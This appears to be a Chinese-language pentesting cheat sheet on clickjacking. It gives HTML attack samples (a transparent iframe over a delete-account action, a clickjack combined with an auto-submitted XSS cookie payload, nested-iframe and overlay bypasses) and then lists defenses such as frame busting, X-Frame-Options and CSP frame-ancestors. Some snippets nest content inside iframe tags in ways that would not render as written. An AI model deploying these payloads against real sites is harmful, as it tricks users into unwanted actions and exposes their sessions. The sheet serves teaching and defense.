# 点击劫持补充

## 1. 基础点击劫持

### 原理

利用透明iframe覆盖在合法按钮上，诱导用户点击

### 示例

```html
<html>
<head>
<title>Clickjack Attack</title>
</head>
<body>
  <iframe src="http://target.com/delete-account" style="opacity:0; position:absolute; top:0; left:0; width:100%; height:100%;">
  <button>Click to Win Prize!</button>
</body>
</html>
```

---

## 2. 点击劫持+XSS

### 组合利用

```html
<iframe src="http://target.com/post" style="opacity:0; position:absolute; top:0; left:0;">
<form action="http://target.com/post" method="POST" id="pwn">
<input type="hidden" name="content" value="<script>alert(document.cookie)</script>">
</form>
<script>document.getElementById('pwn').submit();</script>
</iframe>
```

---

## 3. 绕过技术

### 多层iframe

```html
<iframe src="page1.html" style="opacity:0">
  <iframe src="page2.html" style="opacity:0">
    <iframe src="target.html">
    </iframe>
  </iframe>
</iframe>
```

### CSS覆盖

```html
<div style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:9999;">
  <button>Win Prize!</button>
</div>
<iframe src="http://target.com/action" style="opacity:0;">
```

---

## 4. 防御措施

### Frame busting

```javascript
if (top !== self) {
  top.location = self.location;
}
```

### X-Frame-Options

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://example.com
```

### CSP

```
Content-Security-Policy: frame-ancestors 'self';
```
